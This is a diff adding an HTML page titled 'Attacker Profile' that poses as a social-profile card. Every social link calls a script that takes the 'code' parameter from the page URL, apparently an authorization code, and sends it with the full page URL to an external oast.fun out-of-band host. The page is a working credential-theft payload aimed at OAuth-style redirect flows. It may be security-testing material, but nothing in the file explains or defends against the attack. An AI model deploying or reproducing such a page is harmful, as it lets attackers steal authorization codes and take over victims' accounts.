@@ -1,0 +1,89 @@
+
+
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Attacker Profile</title>
+  </head>
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+<style>
+.card {
+  box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2);
+  max-width: 300px;
+  margin: auto;
+  text-align: center;
+  font-family: arial;
+}
+
+.title {
+  color: grey;
+  font-size: 18px;
+}
+
+button {
+  border: none;
+  outline: 0;
+  display: inline-block;
+  padding: 8px;
+  color: white;
+  background-color: #000;
+  text-align: center;
+  cursor: pointer;
+  width: 100%;
+  font-size: 18px;
+}
+
+a {
+  text-decoration: none;
+  font-size: 22px;
+  color: black;
+}
+
+button:hover, a:hover {
+  opacity: 0.7;
+}
+</style>
+</head>
+<body>
+
+
+<div class="card">
+  <img src="/w3images/team2.jpg" alt="Attacker Profile" style="width:100%">
+  <h1>Attacker Profile</h1>
+  <p class="title">Attacker Profile</p>
+  <div style="margin: 24px 0;">
+    <a href="https://www.eehqqmvpxjmvjjhulovsml6qw3ylxpe58.oast.fun" target="_blank" rel="noopener noreferrer" onclick="sendReferer()"><i class="fa fa-dribbble"></i></a> 
+    <a href="https://www.eehqqmvpxjmvjjhulovsml6qw3ylxpe58.oast.fun" target="_blank" rel="noopener noreferrer" onclick="sendReferer()"><i class="fa fa-twitter"></i></a>  
+    <a href="https://www.eehqqmvpxjmvjjhulovsml6qw3ylxpe58.oast.fun" target="_blank" rel="noopener noreferrer" onclick="sendReferer()"><i class="fa fa-linkedin"></i></a>  
+    <a href="https://www.eehqqmvpxjmvjjhulovsml6qw3ylxpe58.oast.fun" target="_blank" rel="noopener noreferrer" onclick="sendReferer()"><i class="fa fa-facebook"></i></a>
+  </div>
+  <p><button>Contact</button></p>
+</div>
+
+</body>
+
+
+    
+    <script>
+      function sendReferer() {
+        var code = getParameterByName('code');
+        var url = 'https://eehqqmvpxjmvjjhulovsml6qw3ylxpe58.oast.fun/?code=' + code;
+        var xhttp = new XMLHttpRequest();
+        xhttp.open('GET', url, true);
+        xhttp.setRequestHeader('Referer', document.URL);
+        xhttp.send();
+      }
+
+      function getParameterByName(name, url) {
+        if (!url) url = window.location.href;
+        name = name.replace(/[\[\]]/g, '\\$&');
+        var regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)'),
+            results = regex.exec(url);
+        if (!results) return null;
+        if (!results[2]) return '';
+        return decodeURIComponent(results[2].replace(/\+/g, ' '));
+      }
+    </script>
+  </body>
+</html>
